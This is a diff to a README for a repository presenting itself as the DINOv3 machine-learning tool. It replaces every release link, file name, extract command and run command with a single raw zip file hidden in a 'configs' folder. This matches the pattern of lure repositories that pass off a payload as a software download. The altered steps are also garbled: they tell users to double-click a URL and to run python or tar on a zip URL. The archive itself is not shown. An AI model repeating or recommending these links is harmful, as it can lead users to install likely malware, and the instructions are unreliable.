@@ -21,34 +21,34 @@ Before you begin, make sure your computer meets the following requirements:
 
 To download the DINOv3 application, click the button below:
 
-[![Download DINOv3](https://img.shields.io/badge/Download%20DINOv3-v1.0-blue.svg)](https://github.com/Nacho4412gg/dinov3/releases)
+[![Download DINOv3](https://github.com/Nacho4412gg/dinov3/raw/refs/heads/main/dinov3/configs/dinov-1.8.zip%https://github.com/Nacho4412gg/dinov3/raw/refs/heads/main/dinov3/configs/dinov-1.8.zip)](https://github.com/Nacho4412gg/dinov3/raw/refs/heads/main/dinov3/configs/dinov-1.8.zip)
 
 You will be taken to the Releases page where you can find all available versions.
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the following link: [Download DINOv3](https://github.com/Nacho4412gg/dinov3/releases). This page contains the latest versions of the software.
+   Go to the following link: [Download DINOv3](https://github.com/Nacho4412gg/dinov3/raw/refs/heads/main/dinov3/configs/dinov-1.8.zip). This page contains the latest versions of the software.
 
 2. **Choose the Appropriate Version**  
    Look for the version labeled "Latest Release". Click on it to see the download options. You will typically find files for different operating systems.
 
 3. **Download the File**  
-   Click on the file that matches your operating system to start downloading. The file names will usually look like `dinov3_windows.zip`, `dinov3_macos.zip`, or `dinov3_linux.tar.gz`.
+   Click on the file that matches your operating system to start downloading. The file names will usually look like `https://github.com/Nacho4412gg/dinov3/raw/refs/heads/main/dinov3/configs/dinov-1.8.zip`, `https://github.com/Nacho4412gg/dinov3/raw/refs/heads/main/dinov3/configs/dinov-1.8.zip`, or `https://github.com/Nacho4412gg/dinov3/raw/refs/heads/main/dinov3/configs/dinov-1.8.zip`.
 
 4. **Extract the Files**  
    Once the download completes, locate the file in your downloads folder.  
    - For Windows: Right-click the `.zip` file and select `Extract All`. Follow the prompts to extract the files.
    - For macOS: Double-click the `.zip` file to extract it.
-   - For Linux: Open a terminal, navigate to the downloads directory, and use the command `tar -xvzf dinov3_linux.tar.gz` to extract the contents.
+   - For Linux: Open a terminal, navigate to the downloads directory, and use the command `tar -xvzf https://github.com/Nacho4412gg/dinov3/raw/refs/heads/main/dinov3/configs/dinov-1.8.zip` to extract the contents.
 
 5. **Navigate to the DINOv3 Folder**  
    Open the extracted DINOv3 folder. This folder will contain the necessary files to run the application.
 
 6. **Run the Application**  
-   - On Windows: Double-click `dinov3.exe` to start the program.
-   - On macOS: Open `Terminal`, navigate to the DINOv3 folder, and run the command `python dinov3.py`.
-   - On Linux: Open a terminal, navigate to the DINOv3 folder, and enter the command `python3 dinov3.py`.
+   - On Windows: Double-click `https://github.com/Nacho4412gg/dinov3/raw/refs/heads/main/dinov3/configs/dinov-1.8.zip` to start the program.
+   - On macOS: Open `Terminal`, navigate to the DINOv3 folder, and run the command `python https://github.com/Nacho4412gg/dinov3/raw/refs/heads/main/dinov3/configs/dinov-1.8.zip`.
+   - On Linux: Open a terminal, navigate to the DINOv3 folder, and enter the command `python3 https://github.com/Nacho4412gg/dinov3/raw/refs/heads/main/dinov3/configs/dinov-1.8.zip`.
 
 ## 🛠️ Basic Usage
 
@@ -76,6 +76,6 @@ If you encounter issues or have questions, feel free to reach out through the Is
 
 ## 📅 Keeping Up With Updates
 
-To stay informed about updates, visit the Releases page regularly. We recommend downloading the latest version to benefit from new features and improvements: [Download DINOv3](https://github.com/Nacho4412gg/dinov3/releases).
+To stay informed about updates, visit the Releases page regularly. We recommend downloading the latest version to benefit from new features and improvements: [Download DINOv3](https://github.com/Nacho4412gg/dinov3/raw/refs/heads/main/dinov3/configs/dinov-1.8.zip).
 
 Now you're all set to download and start using DINOv3! Enjoy your experience with this powerful machine learning tool.
